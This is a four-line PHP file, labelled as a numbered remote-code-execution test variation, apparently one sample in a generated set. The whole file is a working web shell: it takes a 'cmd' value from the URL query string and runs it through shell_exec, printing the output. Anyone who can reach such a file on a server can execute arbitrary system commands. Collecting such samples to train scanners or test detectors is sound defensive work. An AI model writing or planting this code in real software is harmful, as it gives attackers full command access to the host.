<?php
// RCE test variation #867
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>